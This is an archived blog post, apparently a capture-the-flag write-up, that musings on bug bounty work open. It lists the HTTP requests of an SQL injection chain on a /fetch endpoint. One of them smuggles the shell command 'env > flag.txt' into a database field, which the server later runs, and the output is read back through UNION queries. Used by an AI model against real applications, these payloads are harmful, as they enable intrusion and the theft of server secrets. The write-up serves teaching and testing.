# Injection Vulnerabilities

- **Source URL:** https://medium.com/@lukewago/injection-vulnerabilities-the-incursion-0da0be6764fe?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/@lukewago/injection-vulnerabilities-the-incursion-0da0be6764fe?source=rss-18ff4fb37d5c------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14850 (id 14850)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** lukewago / Tue, 25 Aug 2026 14:39:53 GMT

Now here is the disturbing part:

While Infrastructure security , you can call it SOC …gives you a limited time to solve an incident due to SLAs (Service Level Agreements) and the severity levels the incident is protesting to account for as little down-time as possible , Bugbounty is saying another thing … Bugbounty / Bughunting is a slow process where it demands to take your time and asses the web application.

Here , you are searching for breadcrumbs that of-course pay high and don’t need a Job application just your sheer will , time and patience plus understanding the logic behind the Business hunt.

So which shall you focus on ? if you already found a Job then bug hunting can always be your side-hustle but it too requires time and presence and this leads to an incursion …

**“ where worlds start to clash into each other ”**

And the first lie they sell you is that with proxies , VPNS , you are un-traceable …

Like when you delete everything on your phone , you think it is all wiped clean , **right ?? right ???**

Manual testing a vulnerable web application to see how far this gets us …

As seen below , navigating through the Parameter **id** in **/fetch** endpoint from **id=1** upto **2** seemed to work okay …

On proceeding to parameter id=3 , the system breaks as 500 Internal Server Error …

The application was found to have a vulnerable endpoint at **/fetch** with an **id** parameter.

Manual testing revealed a vulnerability using delimiter testing.

The application returned an error response, confirming the presence of an injection.

The UNION-based SQL injection as seen below revealed the database structure and allowed us to extract the schema information.

The identified SQL injection was leveraged to achieve remote command execution through a writable file operation.

GET /fetch?id=1; UPDATE photos SET filename="; env > flag.txt" WHERE id=3; COMMIT; -- HTTP/1.1

To trigger the update above , we had to request the root path to trigger the web application to process the previously injected command, effectively executing **env > flag.txt** on the server.

This final **UNION-based SQL injection** read the contents of the **flag.txt** file that was created during the command execution phase above , returning everything back to us.

2\. **Privilege Escalation:**

3\. **Command Execution:**

4\. **Data Exfiltration:**

*So , in the upcoming DOOM’s DAY , are we going to ignore the fact that we have Thor, Steve & Vision duo who can put up a great fight scene OR will marvel forget about white-vision and nerf all the team just to favor the dramatic entry of MR. DOOM !?!*

[Are SQL Injection Vulnerabilities Absolete ?](https://medium.com/@lukewago/are-sql-injection-vulnerabilities-absolete-512d32262c69)

The following requests were identified during the attack:

\# Vulnerability discovery

GET /fetch?id='

GET /fetch?id=0 UNION SELECT 'main.py'--

# Command injection

GET /fetch?id=1; UPDATE photos SET filename="; env > flag.txt" WHERE id=3; COMMIT;--

# Trigger execution

GET / HTTP/2

# Retrieve flag

GET /fetch?id=4%20UNION%20SELECT%20'flag.txt'%20-- %20HTTP/1.1

This challenge demonstrates a realistic web application vulnerability chain where:

**SQL injection provided initial access**

**Command injection allowed arbitrary code execution**

**File write capabilities allowed data exfiltration**

This attack vector highlights the importance of layered security controls, proper input handling, and minimal privilege principles in web application development.

The total exploitation time from initial vulnerability discovery suggests the critical nature of these vulnerabilities in production environments as vital.

Alright , 7h47 w1LL 63 411 Fr0m M3 70 Y0u …

“A PIECE OF MY TIME” as ULTRON always says !!!!
